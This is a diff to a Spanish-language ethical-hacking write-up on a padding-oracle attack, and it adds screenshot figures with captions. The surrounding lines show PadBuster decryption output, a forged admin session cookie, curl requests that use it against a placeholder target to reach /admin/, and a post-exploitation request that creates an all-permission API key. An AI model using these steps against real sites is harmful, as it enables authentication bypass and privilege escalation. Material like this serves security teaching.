@@ -265,6 +265,11 @@ for i in {0..255}; do
 done</code>
                     </div>
 
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-10.png" alt="Padding Oracle detection HTTP responses" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">🕵️ <strong>Detección de Oracle:</strong> Comparación de respuestas del servidor mostrando comportamientos diferenciados. Se observa "Invalid padding" para padding inválido vs respuestas normales, confirmando la presencia del oracle vulnerable.</figcaption>
+                    </figure>
+
                     <div class="alert alert-info">
                         <p>Oracle confirmado: modificaciones del último byte generan respuestas HTTP 500 con mensaje "Invalid padding" versus respuestas normales.</p>
                     </div>
@@ -288,6 +293,11 @@ padbuster.pl http://target.com/dashboard \
 # [+] Decrypted value (ASCII): admin;role=user;timestamp=1640995200</code>
                     </div>
 
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-11.png" alt="PadBuster decryption process" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">⚙️ <strong>PadBuster en Acción:</strong> Proceso de descifrado automático con PadBuster mostrando el progreso bloque por bloque. La herramienta explota sistemáticamente el oracle para revelar el contenido cifrado de la cookie de sesión.</figcaption>
+                    </figure>
+
                     <h4>Fase 3: Cifrado de Datos Maliciosos</h4>
                     <div class="code-block">
                         <div class="code-label">PadBuster - Encrypt</div>
@@ -303,6 +313,11 @@ malicious_cookie="bmV3X2FkbWluX2Nvb2tpZQAAAABBQkNE%2F1pL8sKm9zX%3D"
 curl -H "Cookie: session=$malicious_cookie" http://target.com/admin/
 # HTTP 200: ¡Acceso administrativo obtenido!</code>
                     </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-12.png" alt="PadBuster malicious cookie generation" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">🔥 <strong>Generación de Cookie Maliciosa:</strong> PadBuster creando una cookie cifrada con privilegios administrativos. Se muestra cómo la herramienta genera un ciphertext válido para datos controlados (role=admin), permitiendo escalación de privilegios.</figcaption>
+                    </figure>
 
                     <h4>Fase 4: Post-Explotación</h4>
                     <div class="code-block">
@@ -324,6 +339,11 @@ curl -b "session=$malicious_cookie" \
      -d "action=create_api_key&permissions=all" \
      http://target.com/admin/api</code>
                     </div>
+
+                    <figure class="wp-block-image size-full">
+                        <img src="https://usefdoybenz.github.io/ethicalhacking/wp-content/uploads/2024/02/image-13.png" alt="Administrative access achieved via padding oracle" style="border-radius: 8px; border: 1px solid var(--border-color); margin: 2rem 0;">
+                        <figcaption style="text-align: center; margin-top: 1rem; color: var(--text-secondary); font-style: italic;">✅ <strong>Acceso Administrativo Logrado:</strong> Bypass exitoso de autenticación usando la cookie generada maliciosamente. Se observa acceso completo al panel administrativo con capacidades de gestión de usuarios, logs y configuración del sistema.</figcaption>
+                    </figure>
 
                     <div class="alert alert-info">
                         <p><strong>Resultado:</strong> Acceso administrativo completo obtenido mediante bypass criptográfico, capacidad de crear usuarios, acceder a logs sensibles y generar API keys persistentes.</p>
